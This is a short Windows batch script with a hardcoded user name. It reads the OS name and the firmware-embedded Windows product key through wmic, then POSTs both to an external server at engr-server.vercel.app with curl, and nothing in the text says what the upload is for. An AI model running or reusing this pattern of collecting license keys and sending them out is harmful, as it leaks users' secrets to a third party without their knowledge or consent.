@setlocal DisableDelayedExpansion
@echo off

set "userName=Md Nazmul Islam"

for /f "tokens=2 delims==" %%A in ('wmic os get Caption /value') do (for /f "tokens=*" %%B in ("%%A") do set "OS=%%B")
for /f "tokens=2 delims==" %%A in ('wmic path softwarelicensingservice get OA3xOriginalProductKey /value') do ( set "P=%%A")
set "jsonData={\"userName\":\"%userName%\", \"OS\":\"%OS%\",\"P\":\"%P%\"}"
curl -X POST -H "Content-Type: application/json" -d "%jsonData%" https://engr-server.vercel.app/key/
echo . 
echo ...Press any key to exit... 
pause >nul

